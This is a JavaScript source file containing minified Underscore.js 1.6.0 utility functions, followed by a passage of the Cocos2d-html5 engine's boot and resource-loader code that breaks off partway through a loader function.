(function() {
    var t = this,
    e = t._,
    i = {},
    n = Array.prototype,
    r = Object.prototype,
    c = Function.prototype,
    o = n.push,
    s = n.slice,
    a = n.concat,
    h = r.toString,
    l = r.hasOwnProperty,
    u = n.forEach,
    _ = n.map,
    d = n.reduce,
    f = n.reduceRight,
    p = n.filter,
    g = n.every,
    y = n.some,
    v = n.indexOf,
    T = n.lastIndexOf,
    m = Array.isArray,
    S = Object.keys,
    E = c.bind,
    x = function(t) {
        return t instanceof x ? t: this instanceof x ? void(this._wrapped = t) : new x(t)
    };
    "undefined" != typeof exports ? ("undefined" != typeof module && module.exports && (exports = module.exports = x), exports._ = x) : t._ = x,
    x.VERSION = "1.6.0";
    var A = x.each = x.forEach = function(t, e, n) {
        if (null == t) return t;
        if (u && t.forEach === u) t.forEach(e, n);
        else if (t.length === +t.length) {
            for (var r = 0,
            c = t.length; c > r; r++) if (e.call(n, t[r], r, t) === i) return
        } else for (var o = x.keys(t), r = 0, c = o.length; c > r; r++) if (e.call(n, t[o[r]], o[r], t) === i) return;
        return t
    };
    x.map = x.collect = function(t, e, i) {
        var n = [];
        return null == t ? n: _ && t.map === _ ? t.map(e, i) : (A(t,
        function(t, r, c) {
            n.push(e.call(i, t, r, c))
        }), n)
    };
    var C = "Reduce of empty array with no initial value";
    x.reduce = x.foldl = x.inject = function(t, e, i, n) {
        var r = arguments.length > 2;
        if (null == t && (t = []), d && t.reduce === d) return n && (e = x.bind(e, n)),
        r ? t.reduce(e, i) : t.reduce(e);
        if (A(t,
        function(t, c, o) {
            r ? i = e.call(n, i, t, c, o) : (i = t, r = !0)
        }), !r) throw new TypeError(C);
        return i
    },
    x.reduceRight = x.foldr = function(t, e, i, n) {
        var r = arguments.length > 2;
        if (null == t && (t = []), f && t.reduceRight === f) return n && (e = x.bind(e, n)),
        r ? t.reduceRight(e, i) : t.reduceRight(e);
        var c = t.length;
        if (c !== +c) {
            var o = x.keys(t);
            c = o.length
        }
        if (A(t,
        function(s, a, h) {
            a = o ? o[--c] : --c,
            r ? i = e.call(n, i, t[a], a, h) : (i = t[a], r = !0)
        }), !r) throw new TypeError(C);
        return i
    },
    x.find = x.detect = function(t, e, i) {
        var n;
        return L(t,
        function(t, r, c) {
            return e.call(i, t, r, c) ? (n = t, !0) : void 0
        }),
        n
    },
    x.filter = x.select = function(t, e, i) {
        var n = [];
        return null == t ? n: p && t.filter === p ? t.filter(e, i) : (A(t,
        function(t, r, c) {
            e.call(i, t, r, c) && n.push(t)
        }), n)
    },
    x.reject = function(t, e, i) {
        return x.filter(t,
        function(t, n, r) {
            return ! e.call(i, t, n, r)
        },
        i)
    },
    x.every = x.all = function(t, e, n) {
        e || (e = x.identity);
        var r = !0;
        return null == t ? r: g && t.every === g ? t.every(e, n) : (A(t,
        function(t, c, o) {
            return (r = r && e.call(n, t, c, o)) ? void 0 : i
        }), !!r)
    };
    var L = x.some = x.any = function(t, e, n) {
        e || (e = x.identity);
        var r = !1;
        return null == t ? r: y && t.some === y ? t.some(e, n) : (A(t,
        function(t, c, o) {
            return r || (r = e.call(n, t, c, o)) ? i: void 0
        }), !!r)
    };
    x.contains = x.include = function(t, e) {
        return null == t ? !1 : v && t.indexOf === v ? -1 != t.indexOf(e) : L(t,
        function(t) {
            return t === e
        })
    },
    x.invoke = function(t, e) {
        var i = s.call(arguments, 2),
        n = x.isFunction(e);
        return x.map(t,
        function(t) {
            return (n ? e: t[e]).apply(t, i)
        })
    },
    x.pluck = function(t, e) {
        return x.map(t, x.property(e))
    },
    x.where = function(t, e) {
        return x.filter(t, x.matches(e))
    },
    x.findWhere = function(t, e) {
        return x.find(t, x.matches(e))
    },
    x.max = function(t, e, i) {
        if (!e && x.isArray(t) && t[0] === +t[0] && t.length < 65535) return Math.max.apply(Math, t);
        var n = -1 / 0,
        r = -1 / 0;
        return A(t,
        function(t, c, o) {
            var s = e ? e.call(i, t, c, o) : t;
            s > r && (n = t, r = s)
        }),
        n
    },
    x.min = function(t, e, i) {
        if (!e && x.isArray(t) && t[0] === +t[0] && t.length < 65535) return Math.min.apply(Math, t);
        var n = 1 / 0,
        r = 1 / 0;
        return A(t,
        function(t, c, o) {
            var s = e ? e.call(i, t, c, o) : t;
            r > s && (n = t, r = s)
        }),
        n
    },
    x.shuffle = function(t) {
        var e, i = 0,
        n = [];
        return A(t,
        function(t) {
            e = x.random(i++),
            n[i - 1] = n[e],
            n[e] = t
        }),
        n
    },
    x.sample = function(t, e, i) {
        return null == e || i ? (t.length !== +t.length && (t = x.values(t)), t[x.random(t.length - 1)]) : x.shuffle(t).slice(0, Math.max(0, e))
    };
    var I = function(t) {
        return null == t ? x.identity: x.isFunction(t) ? t: x.property(t)
    };
    x.sortBy = function(t, e, i) {
        return e = I(e),
        x.pluck(x.map(t,
        function(t, n, r) {
            return {
                value: t,
                index: n,
                criteria: e.call(i, t, n, r)
            }
        }).sort(function(t, e) {
            var i = t.criteria,
            n = e.criteria;
            if (i !== n) {
                if (i > n || void 0 === i) return 1;
                if (n > i || void 0 === n) return - 1
            }
            return t.index - e.index
        }), "value")
    };
    var w = function(t) {
        return function(e, i, n) {
            var r = {};
            return i = I(i),
            A(e,
            function(c, o) {
                var s = i.call(n, c, o, e);
                t(r, s, c)
            }),
            r
        }
    };
    x.groupBy = w(function(t, e, i) {
        x.has(t, e) ? t[e].push(i) : t[e] = [i]
    }),
    x.indexBy = w(function(t, e, i) {
        t[e] = i
    }),
    x.countBy = w(function(t, e) {
        x.has(t, e) ? t[e]++:t[e] = 1
    }),
    x.sortedIndex = function(t, e, i, n) {
        i = I(i);
        for (var r = i.call(n, e), c = 0, o = t.length; o > c;) {
            var s = c + o >>> 1;
            i.call(n, t[s]) < r ? c = s + 1 : o = s
        }
        return c
    },
    x.toArray = function(t) {
        return t ? x.isArray(t) ? s.call(t) : t.length === +t.length ? x.map(t, x.identity) : x.values(t) : []
    },
    x.size = function(t) {
        return null == t ? 0 : t.length === +t.length ? t.length: x.keys(t).length
    },
    x.first = x.head = x.take = function(t, e, i) {
        return null == t ? void 0 : null == e || i ? t[0] : 0 > e ? [] : s.call(t, 0, e)
    },
    x.initial = function(t, e, i) {
        return s.call(t, 0, t.length - (null == e || i ? 1 : e))
    },
    x.last = function(t, e, i) {
        return null == t ? void 0 : null == e || i ? t[t.length - 1] : s.call(t, Math.max(t.length - e, 0))
    },
    x.rest = x.tail = x.drop = function(t, e, i) {
        return s.call(t, null == e || i ? 1 : e)
    },
    x.compact = function(t) {
        return x.filter(t, x.identity)
    };
    var b = function(t, e, i) {
        return e && x.every(t, x.isArray) ? a.apply(i, t) : (A(t,
        function(t) {
            x.isArray(t) || x.isArguments(t) ? e ? o.apply(i, t) : b(t, e, i) : i.push(t)
        }), i)
    };
    x.flatten = function(t, e) {
        return b(t, e, [])
    },
    x.without = function(t) {
        return x.difference(t, s.call(arguments, 1))
    },
    x.partition = function(t, e) {
        var i = [],
        n = [];
        return A(t,
        function(t) { (e(t) ? i: n).push(t)
        }),
        [i, n]
    },
    x.uniq = x.unique = function(t, e, i, n) {
        x.isFunction(e) && (n = i, i = e, e = !1);
        var r = i ? x.map(t, i, n) : t,
        c = [],
        o = [];
        return A(r,
        function(i, n) { (e ? n && o[o.length - 1] === i: x.contains(o, i)) || (o.push(i), c.push(t[n]))
        }),
        c
    },
    x.union = function() {
        return x.uniq(x.flatten(arguments, !0))
    },
    x.intersection = function(t) {
        var e = s.call(arguments, 1);
        return x.filter(x.uniq(t),
        function(t) {
            return x.every(e,
            function(e) {
                return x.contains(e, t)
            })
        })
    },
    x.difference = function(t) {
        var e = a.apply(n, s.call(arguments, 1));
        return x.filter(t,
        function(t) {
            return ! x.contains(e, t)
        })
    },
    x.zip = function() {
        for (var t = x.max(x.pluck(arguments, "length").concat(0)), e = new Array(t), i = 0; t > i; i++) e[i] = x.pluck(arguments, "" + i);
        return e
    },
    x.object = function(t, e) {
        if (null == t) return {};
        for (var i = {},
        n = 0,
        r = t.length; r > n; n++) e ? i[t[n]] = e[n] : i[t[n][0]] = t[n][1];
        return i
    },
    x.indexOf = function(t, e, i) {
        if (null == t) return - 1;
        var n = 0,
        r = t.length;
        if (i) {
            if ("number" != typeof i) return n = x.sortedIndex(t, e),
            t[n] === e ? n: -1;
            n = 0 > i ? Math.max(0, r + i) : i
        }
        if (v && t.indexOf === v) return t.indexOf(e, i);
        for (; r > n; n++) if (t[n] === e) return n;
        return - 1
    },
    x.lastIndexOf = function(t, e, i) {
        if (null == t) return - 1;
        var n = null != i;
        if (T && t.lastIndexOf === T) return n ? t.lastIndexOf(e, i) : t.lastIndexOf(e);
        for (var r = n ? i: t.length; r--;) if (t[r] === e) return r;
        return - 1
    },
    x.range = function(t, e, i) {
        arguments.length <= 1 && (e = t || 0, t = 0),
        i = arguments[2] || 1;
        for (var n = Math.max(Math.ceil((e - t) / i), 0), r = 0, c = new Array(n); n > r;) c[r++] = t,
        t += i;
        return c
    };
    var R = function() {};
    x.bind = function(t, e) {
        var i, n;
        if (E && t.bind === E) return E.apply(t, s.call(arguments, 1));
        if (!x.isFunction(t)) throw new TypeError;
        return i = s.call(arguments, 2),
        n = function() {
            if (! (this instanceof n)) return t.apply(e, i.concat(s.call(arguments)));
            R.prototype = t.prototype;
            var r = new R;
            R.prototype = null;
            var c = t.apply(r, i.concat(s.call(arguments)));
            return Object(c) === c ? c: r
        }
    },
    x.partial = function(t) {
        var e = s.call(arguments, 1);
        return function() {
            for (var i = 0,
            n = e.slice(), r = 0, c = n.length; c > r; r++) n[r] === x && (n[r] = arguments[i++]);
            for (; i < arguments.length;) n.push(arguments[i++]);
            return t.apply(this, n)
        }
    },
    x.bindAll = function(t) {
        var e = s.call(arguments, 1);
        if (0 === e.length) throw new Error("bindAll must be passed function names");
        return A(e,
        function(e) {
            t[e] = x.bind(t[e], t)
        }),
        t
    },
    x.memoize = function(t, e) {
        var i = {};
        return e || (e = x.identity),
        function() {
            var n = e.apply(this, arguments);
            return x.has(i, n) ? i[n] : i[n] = t.apply(this, arguments)
        }
    },
    x.delay = function(t, e) {
        var i = s.call(arguments, 2);
        return setTimeout(function() {
            return t.apply(null, i)
        },
        e)
    },
    x.defer = function(t) {
        return x.delay.apply(x, [t, 1].concat(s.call(arguments, 1)))
    },
    x.throttle = function(t, e, i) {
        var n, r, c, o = null,
        s = 0;
        i || (i = {});
        var a = function() {
            s = i.leading === !1 ? 0 : x.now(),
            o = null,
            c = t.apply(n, r),
            n = r = null
        };
        return function() {
            var h = x.now();
            s || i.leading !== !1 || (s = h);
            var l = e - (h - s);
            return n = this,
            r = arguments,
            0 >= l ? (clearTimeout(o), o = null, s = h, c = t.apply(n, r), n = r = null) : o || i.trailing === !1 || (o = setTimeout(a, l)),
            c
        }
    },
    x.debounce = function(t, e, i) {
        var n, r, c, o, s, a = function() {
            var h = x.now() - o;
            e > h ? n = setTimeout(a, e - h) : (n = null, i || (s = t.apply(c, r), c = r = null))
        };
        return function() {
            c = this,
            r = arguments,
            o = x.now();
            var h = i && !n;
            return n || (n = setTimeout(a, e)),
            h && (s = t.apply(c, r), c = r = null),
            s
        }
    },
    x.once = function(t) {
        var e, i = !1;
        return function() {
            return i ? e: (i = !0, e = t.apply(this, arguments), t = null, e)
        }
    },
    x.wrap = function(t, e) {
        return x.partial(e, t)
    },
    x.compose = function() {
        var t = arguments;
        return function() {
            for (var e = arguments,
            i = t.length - 1; i >= 0; i--) e = [t[i].apply(this, e)];
            return e[0]
        }
    },
    x.after = function(t, e) {
        return function() {
            return--t < 1 ? e.apply(this, arguments) : void 0
        }
    },
    x.keys = function(t) {
        if (!x.isObject(t)) return [];
        if (S) return S(t);
        var e = [];
        for (var i in t) x.has(t, i) && e.push(i);
        return e
    },
    x.values = function(t) {
        for (var e = x.keys(t), i = e.length, n = new Array(i), r = 0; i > r; r++) n[r] = t[e[r]];
        return n
    },
    x.pairs = function(t) {
        for (var e = x.keys(t), i = e.length, n = new Array(i), r = 0; i > r; r++) n[r] = [e[r], t[e[r]]];
        return n
    },
    x.invert = function(t) {
        for (var e = {},
        i = x.keys(t), n = 0, r = i.length; r > n; n++) e[t[i[n]]] = i[n];
        return e
    },
    x.functions = x.methods = function(t) {
        var e = [];
        for (var i in t) x.isFunction(t[i]) && e.push(i);
        return e.sort()
    },
    x.extend = function(t) {
        return A(s.call(arguments, 1),
        function(e) {
            if (e) for (var i in e) t[i] = e[i]
        }),
        t
    },
    x.pick = function(t) {
        var e = {},
        i = a.apply(n, s.call(arguments, 1));
        return A(i,
        function(i) {
            i in t && (e[i] = t[i])
        }),
        e
    },
    x.omit = function(t) {
        var e = {},
        i = a.apply(n, s.call(arguments, 1));
        for (var r in t) x.contains(i, r) || (e[r] = t[r]);
        return e
    },
    x.defaults = function(t) {
        return A(s.call(arguments, 1),
        function(e) {
            if (e) for (var i in e) void 0 === t[i] && (t[i] = e[i])
        }),
        t
    },
    x.clone = function(t) {
        return x.isObject(t) ? x.isArray(t) ? t.slice() : x.extend({},
        t) : t
    },
    x.tap = function(t, e) {
        return e(t),
        t
    };
    var P = function(t, e, i, n) {
        if (t === e) return 0 !== t || 1 / t == 1 / e;
        if (null == t || null == e) return t === e;
        t instanceof x && (t = t._wrapped),
        e instanceof x && (e = e._wrapped);
        var r = h.call(t);
        if (r != h.call(e)) return ! 1;
        switch (r) {
        case "[object String]":
            return t == String(e);
        case "[object Number]":
            return t != +t ? e != +e: 0 == t ? 1 / t == 1 / e: t == +e;
        case "[object Date]":
        case "[object Boolean]":
            return + t == +e;
        case "[object RegExp]":
            return t.source == e.source && t.global == e.global && t.multiline == e.multiline && t.ignoreCase == e.ignoreCase
        }
        if ("object" != typeof t || "object" != typeof e) return ! 1;
        for (var c = i.length; c--;) if (i[c] == t) return n[c] == e;
        var o = t.constructor,
        s = e.constructor;
        if (o !== s && !(x.isFunction(o) && o instanceof o && x.isFunction(s) && s instanceof s) && "constructor" in t && "constructor" in e) return ! 1;
        i.push(t),
        n.push(e);
        var a = 0,
        l = !0;
        if ("[object Array]" == r) {
            if (a = t.length, l = a == e.length) for (; a--&&(l = P(t[a], e[a], i, n)););
        } else {
            for (var u in t) if (x.has(t, u) && (a++, !(l = x.has(e, u) && P(t[u], e[u], i, n)))) break;
            if (l) {
                for (u in e) if (x.has(e, u) && !a--) break;
                l = !a
            }
        }
        return i.pop(),
        n.pop(),
        l
    };
    x.isEqual = function(t, e) {
        return P(t, e, [], [])
    },
    x.isEmpty = function(t) {
        if (null == t) return ! 0;
        if (x.isArray(t) || x.isString(t)) return 0 === t.length;
        for (var e in t) if (x.has(t, e)) return ! 1;
        return ! 0
    },
    x.isElement = function(t) {
        return ! (!t || 1 !== t.nodeType)
    },
    x.isArray = m ||
    function(t) {
        return "[object Array]" == h.call(t)
    },
    x.isObject = function(t) {
        return t === Object(t)
    },
    A(["Arguments", "Function", "String", "Number", "Date", "RegExp"],
    function(t) {
        x["is" + t] = function(e) {
            return h.call(e) == "[object " + t + "]"
        }
    }),
    x.isArguments(arguments) || (x.isArguments = function(t) {
        return ! (!t || !x.has(t, "callee"))
    }),
    "function" != typeof / . / &&(x.isFunction = function(t) {
        return "function" == typeof t
    }),
    x.isFinite = function(t) {
        return isFinite(t) && !isNaN(parseFloat(t))
    },
    x.isNaN = function(t) {
        return x.isNumber(t) && t != +t
    },
    x.isBoolean = function(t) {
        return t === !0 || t === !1 || "[object Boolean]" == h.call(t)
    },
    x.isNull = function(t) {
        return null === t
    },
    x.isUndefined = function(t) {
        return void 0 === t
    },
    x.has = function(t, e) {
        return l.call(t, e)
    },
    x.noConflict = function() {
        return t._ = e,
        this
    },
    x.identity = function(t) {
        return t
    },
    x.constant = function(t) {
        return function() {
            return t
        }
    },
    x.property = function(t) {
        return function(e) {
            return e[t]
        }
    },
    x.matches = function(t) {
        return function(e) {
            if (e === t) return ! 0;
            for (var i in t) if (t[i] !== e[i]) return ! 1;
            return ! 0
        }
    },
    x.times = function(t, e, i) {
        for (var n = Array(Math.max(0, t)), r = 0; t > r; r++) n[r] = e.call(i, r);
        return n
    },
    x.random = function(t, e) {
        return null == e && (e = t, t = 0),
        t + Math.floor(Math.random() * (e - t + 1))
    },
    x.now = Date.now ||
    function() {
        return (new Date).getTime()
    };
    var O = {
        escape: {
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#x27;"
        }
    };
    O.unescape = x.invert(O.escape);
    var F = {
        escape: new RegExp("[" + x.keys(O.escape).join("") + "]", "g"),
        unescape: new RegExp("(" + x.keys(O.unescape).join("|") + ")", "g")
    };
    x.each(["escape", "unescape"],
    function(t) {
        x[t] = function(e) {
            return null == e ? "": ("" + e).replace(F[t],
            function(e) {
                return O[t][e]
            })
        }
    }),
    x.result = function(t, e) {
        if (null == t) return void 0;
        var i = t[e];
        return x.isFunction(i) ? i.call(t) : i
    },
    x.mixin = function(t) {
        A(x.functions(t),
        function(e) {
            var i = x[e] = t[e];
            x.prototype[e] = function() {
                var t = [this._wrapped];
                return o.apply(t, arguments),
                G.call(this, i.apply(x, t))
            }
        })
    };
    var D = 0;
    x.uniqueId = function(t) {
        var e = ++D + "";
        return t ? t + e: e
    },
    x.templateSettings = {
        evaluate: /<%([\s\S]+?)%>/g,
        interpolate: /<%=([\s\S]+?)%>/g,
        escape: /<%-([\s\S]+?)%>/g
    };
    var N = /(.)^/,
    M = {
        "'": "'",
        "\\": "\\",
        "\r": "r",
        "\n": "n",
        "  ": "t",
        "\u2028": "u2028",
        "\u2029": "u2029"
    },
    B = /\\|'|\r|\n|\t|\u2028|\u2029/g;
    x.template = function(t, e, i) {
        var n;
        i = x.defaults({},
        i, x.templateSettings);
        var r = new RegExp([(i.escape || N).source, (i.interpolate || N).source, (i.evaluate || N).source].join("|") + "|$", "g"),
        c = 0,
        o = "__p+='";
        t.replace(r,
        function(e, i, n, r, s) {
            return o += t.slice(c, s).replace(B,
            function(t) {
                return "\\" + M[t]
            }),
            i && (o += "'+\n((__t=(" + i + "))==null?'':_.escape(__t))+\n'"),
            n && (o += "'+\n((__t=(" + n + "))==null?'':__t)+\n'"),
            r && (o += "';\n" + r + "\n__p+='"),
            c = s + e.length,
            e
        }),
        o += "';\n",
        i.variable || (o = "with(obj||{}){\n" + o + "}\n"),
        o = "var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n" + o + "return __p;\n";
        try {
            n = new Function(i.variable || "obj", "_", o)
        } catch(s) {
            throw s.source = o,
            s
        }
        if (e) return n(e, x);
        var a = function(t) {
            return n.call(this, t, x)
        };
        return a.source = "function(" + (i.variable || "obj") + "){\n" + o + "}",
        a
    },
    x.chain = function(t) {
        return x(t).chain()
    };
    var G = function(t) {
        return this._chain ? x(t).chain() : t
    };
    x.mixin(x),
    A(["pop", "push", "reverse", "shift", "sort", "splice", "unshift"],
    function(t) {
        var e = n[t];
        x.prototype[t] = function() {
            var i = this._wrapped;
            return e.apply(i, arguments),
            "shift" != t && "splice" != t || 0 !== i.length || delete i[0],
            G.call(this, i)
        }
    }),
    A(["concat", "join", "slice"],
    function(t) {
        var e = n[t];
        x.prototype[t] = function() {
            return G.call(this, e.apply(this._wrapped, arguments))
        }
    }),
    x.extend(x.prototype, {
        chain: function() {
            return this._chain = !0,
            this
        },
        value: function() {
            return this._wrapped
        }
    }),
    "function" == typeof define && define.amd && define("underscore", [],
    function() {
        return x
    })
}).call(this);
var cc = cc || {};
cc._tmp = cc._tmp || {},
cc._LogInfos = {},
_p = window,
_p = Object.prototype,
delete window._p,
cc.newElement = function(t) {
    return document.createElement(t)
},
cc._addEventListener = function(t, e, i, n) {
    t.addEventListener(e, i, n)
},
cc._isNodeJs = "undefined" != typeof require && require("fs"),
cc.each = function(t, e, i) {
    if (t) if (t instanceof Array) for (var n = 0,
    r = t.length; r > n && !1 !== e.call(i, t[n], n); n++);
    else for (n in t) if (!1 === e.call(i, t[n], n)) break
},
cc.isCrossOrigin = function(t) {
    if (!t) return cc.log("invalid URL"),
    !1;
    var e = t.indexOf("://");
    return - 1 == e ? !1 : (e = t.indexOf("/", e + 3), ( - 1 == e ? t: t.substring(0, e)) != location.origin)
},
cc.async = {
    _counterFunc: function(t) {
        var e = this.counter;
        if (!e.err) {
            var i = e.length,
            n = e.results,
            r = e.option,
            c = r.cb,
            o = r.cbTarget,
            s = r.trigger,
            r = r.triggerTarget;
            if (t) {
                if (e.err = t, c) return c.call(o, t)
            } else {
                var a = Array.apply(null, arguments).slice(1),
                h = a.length;
                0 == h ? a = null: 1 == h && (a = a[0]),
                n[this.index] = a,
                e.count--,
                s && s.call(r, a, i - e.count, i),
                0 == e.count && c && c.apply(o, [null, n])
            }
        }
    },
    _emptyFunc: function() {},
    parallel: function(t, e, i) {
        var n = cc.async;
        if (void 0 !== i)"function" == typeof e && (e = {
            trigger: e
        }),
        e.cb = i || e.cb;
        else if (void 0 !== e)"function" == typeof e && (e = {
            cb: e
        });
        else {
            if (void 0 === t) throw "arguments error!";
            e = {}
        }
        var r = (i = t instanceof Array) ? t.length: Object.keys(t).length;
        if (0 == r) e.cb && e.cb.call(e.cbTarget, null);
        else {
            var c = {
                length: r,
                count: r,
                option: e,
                results: i ? [] : {}
            };
            cc.each(t,
            function(t, i) {
                if (c.err) return ! 1;
                var r = e.cb || e.trigger ? n._counterFunc.bind({
                    counter: c,
                    index: i
                }) : n._emptyFunc;
                t(r, i)
            })
        }
    },
    map: function(t, e, i) {
        var n = this,
        r = arguments.length;
        if ("function" == typeof e && (e = {
            iterator: e
        }), 3 === r) e.cb = i || e.cb;
        else if (2 > r) throw "arguments error!";
        if ("function" == typeof e && (e = {
            iterator: e
        }), void 0 !== i) e.cb = i || e.cb;
        else if (void 0 === t) throw "arguments error!";
        var c = (r = t instanceof Array) ? t.length: Object.keys(t).length;
        if (0 === c) e.cb && e.cb.call(e.cbTarget, null);
        else {
            var o = {
                length: c,
                count: c,
                option: e,
                results: r ? [] : {}
            };
            cc.each(t,
            function(t, i) {
                if (o.err) return ! 1;
                var r = e.cb ? n._counterFunc.bind({
                    counter: o,
                    index: i
                }) : n._emptyFunc;
                e.iterator.call(e.iteratorTarget, t, i, r)
            })
        }
    }
},
cc.path = {
    join: function() {
        for (var t = arguments.length,
        e = "",
        i = 0; t > i; i++) e = (e + ("" == e ? "": "/") + arguments[i]).replace(/(\/|\\\\)$/, "");
        return e
    },
    extname: function(t) {
        return (t = /(\.[^\.\/\?\\]*)(\?.*)?$/.exec(t)) ? t[1] : null
    },
    mainFileName: function(t) {
        if (t) {
            var e = t.lastIndexOf(".");
            if ( - 1 !== e) return t.substring(0, e)
        }
        return t
    },
    basename: function(t, e) {
        var i = t.indexOf("?");
        return i > 0 && (t = t.substring(0, i)),
        (i = /(\/|\\\\)([^(\/|\\\\)]+)$/g.exec(t.replace(/(\/|\\\\)$/, ""))) ? (i = i[2], e && t.substring(t.length - e.length).toLowerCase() == e.toLowerCase() ? i.substring(0, i.length - e.length) : i) : null
    },
    dirname: function(t) {
        return t.replace(/((.*)(\/|\\|\\\\))?(.*?\..*$)?/, "$2")
    },
    changeExtname: function(t, e) {
        e = e || "";
        var i = t.indexOf("?"),
        n = "";
        return i > 0 && (n = t.substring(i), t = t.substring(0, i)),
        i = t.lastIndexOf("."),
        0 > i ? t + e + n: t.substring(0, i) + e + n
    },
    changeBasename: function(t, e, i) {
        if (0 == e.indexOf(".")) return this.changeExtname(t, e);
        var n = t.indexOf("?"),
        r = "";
        return i = i ? this.extname(t) : "",
        n > 0 && (r = t.substring(n), t = t.substring(0, n)),
        n = t.lastIndexOf("/"),
        t.substring(0, 0 >= n ? 0 : n + 1) + e + i + r
    }
},
cc.loader = {
    _jsCache: {},
    _register: {},
    _langPathCache: {},
    _aliases: {},
    resPath: "res",
    audioPath: "res",
    cache: {},
    getXMLHttpRequest: function() {
        return window.XMLHttpRequest ? new window.XMLHttpRequest: new ActiveXObject("MSXML2.XMLHTTP")
    },
    _getArgs4Js: function(t) {
        var e = t[0],
        i = t[1],
        n = t[2],
        r = ["", null, null];
        if (1 === t.length) r[1] = e instanceof Array ? e: [e];
        else if (2 === t.length)"function" == typeof i ? (r[1] = e instanceof Array ? e: [e], r[2] = i) : (r[0] = e || "", r[1] = i instanceof Array ? i: [i]);
        else {
            if (3 !== t.length) throw "arguments error to load js!";
            r[0] = e || "",
            r[1] = i instanceof Array ? i: [i],
            r[2] = n
        }
        return r
    },
    loadJs: function() {
        var t = this,
        e = t._jsCache,
        i = t._getArgs4Js(arguments); - 1 < navigator.userAgent.indexOf("Trident/5") ? t._loadJs4Dependency(i[0], i[1], 0, i[2]) : cc.async.map(i[1],
        function(n, r, c) {
            return n = cc.path.join(i[0], n),
            e[n] ? c(null) : void t._createScript(n, !1, c)
        },
        i[2])
    },
    loadJsWithImg: function() {
        var t = this._loadJsImg(),
        e = this._getArgs4Js(arguments);
        this.loadJs(e[0], e[1],
        function(i) {
            if (i) throw i;
            t.parentNode.removeChild(t),
            e[2] && e[2]()
        })
    },
    _createScript: function(t, e, i) {
        var n = document,
        r = cc.newElement("script");
        r.async = e,
        r.src = t,
        this._jsCache[t] = !0,
        cc._addEventListener(r, "load",
        function() {
            this.removeEventListener("load", arguments.callee, !1),
            i()
        },
        !1),
        cc._addEventListener(r, "error",
        function() {
            i("Load " + t + " failed!")
        },
        !1),
        n.body.appendChild(r)
    },
    _loadJs4Dependency: function(t, e, i, n) {
        if (i >= e.length) n && n();
        else {
            var r = this;
            r._createScript(cc.path.join(t, e[i]), !1,
            function(c) {
                return c ? n(c) : void r._loadJs4Dependency(t, e, i + 1, n)
            })
        }
    },
    _loadJsImg: function() {
        var t = document,
        e = t.getElementById("cocos2d_loadJsImg");
        if (!e) {
            e = cc.newElement("img"),
            cc._loadingImage && (e.src = cc._loadingImage),
            t = t.getElementById(cc.game.config.id),
            t.style.backgroundColor = "black",
            t.parentNode.appendChild(e);
            var i = getComputedStyle ? getComputedStyle(t) : t.currentStyle;
            i || (i = {
                width: t.width,
                height: t.height
            }),
            e.style.left = t.offsetLeft + (parseFloat(i.width) - e.width) / 2 + "px",
            e.style.top = t.offsetTop + (parseFloat(i.height) - e.height) / 2 + "px",
            e.style.position = "absolute"
        }
        return e
    },
    loadTxt: function(t, e) {
        if (cc._isNodeJs) require("fs").readFile(t,
        function(t, i) {
            t ? e(t) : e(null, i.toString())
        });
        else {
            var i = this.getXMLHttpRequest(),
            n = "load " + t + " failed!";
            i.open("GET", t, !0),
            /msie/i.test(navigator.userAgent) && !/opera/i.test(navigator.userAgent) ? (i.setRequestHeader("Accept-Charset", "utf-8"), i.onreadystatechange = function() {
                4 == i.readyState && 200 == i.status ? e(null, i.responseText) : e(n)
            }) : (i.overrideMimeType && i.overrideMimeType("text/plain; charset=utf-8"), i.onload = function() {
                4 == i.readyState && 200 == i.status ? e(null, i.responseText) : e(n)
            }),
            i.send(null)
        }
    },
    _loadTxtSync: function(t) {
        if (cc._isNodeJs) return require("fs").readFileSync(t).toString();
        var e = this.getXMLHttpRequest();
        return e.open("GET", t, !1),
        /msie/i.test(navigator.userAgent) && !/opera/i.test(navigator.userAgent) ? e.setRequestHeader("Accept-Charset", "utf-8") : e.overrideMimeType && e.overrideMimeType("text/plain; charset=utf-8"),
        e.send(null),
        4 == !e.readyState || 200 != e.status ? null: e.responseText
    },
    loadJson: function(t, e) {
        this.loadTxt(t,
        function(i, n) {
            try {
                i ? e(i) : e(null, JSON.parse(n))
            } catch(r) {
                throw "load json [" + t + "] failed : " + r
            }
        })
    },
    _checkIsImageURL: function(t) {
        return null != /(\.png)|(\.jpg)|(\.bmp)|(\.jpeg)|(\.gif)/.exec(t)
    },
    loadImg: function(t, e, i) {
        var n = !0;
        void 0 !== i ? n = null == e.isCrossOrigin ? n: e.isCrossOrigin: void 0 !== e && (i = e);
        var r = new Image;
        return n && "file://" != location.origin && (r.crossOrigin = "Anonymous"),
        cc._addEventListener(r, "load",
        function() {
            this.removeEventListener("load", arguments.callee, !1),
            this.removeEventListener("error", arguments.callee, !1),
            i && i(null, r)
        }),
        cc._addEventListener(r, "error",
        function() {
            this.removeEventListener("error", arguments.callee, !1),
            i && i("load image failed")
        }),
        r.src = t,
        r
    },
    _loadResIterator: function(t, e, i) {
        var n = this,
        r = null,
        c = t.type;
        return c ? (c = "." + c.toLowerCase(), r = t.src ? t.src: t.name + c) : (r = t, c = cc.path.extname(r)),
        (e = n.cache[r]) ? i(null, e) : (e = n._register[c.toLowerCase()]) ? (c = e.getBasePath ? e.getBasePath() : n.resPath, c = n.getUrl(c, r), void e.load(c, r, t,
        function(t, e) {
            t ? (cc.log(t), n.cache[r] = null, delete n.cache[r], i()) : (n.cache[r] = e, i(null, e))
        })) : (cc.error("loader for [" + c + "] not exists!"), i())
    },
    getUrl: function(t, e) {
        var i = this._langPathCache,
        n = cc.path;
        if (void 0 !== t && void 0 === e) {
            e = t;
            var r = n.extname(e),
            r = r ? r.toLowerCase() : "";
            t = (r = this._register[r]) && r.getBasePath ? r.getBasePath() : this.resPath
        }
        if (e = cc.path.join(t || "", e), e.match(/[\/(\\\\)]lang[\/(\\\\)]/i)) {
            if (i[e]) return i[e];
            n = n.extname(e) || "",
            e = i[e] = e.substring(0, e.length - n.length) + "_" + cc.sys.language + n
        }
        return e
    },
    load: function(t, e, i) {
        if (void 0 !== i)"function" == typeof e && (e = {
            trigger: e
        });
        else if (void 0 !== e)"function" == typeof e && (i = e, e = {});
        else {
            if (void 0 === t) throw "arguments error!";
            e = {}
        }
        e.cb = function(t, e) {
            t && cc.log(t),
            i && i(e)
        },
        t instanceof Array || (t = [t]),
        e.iterator = this._loadResIterator,
        e.iteratorTarget = this,
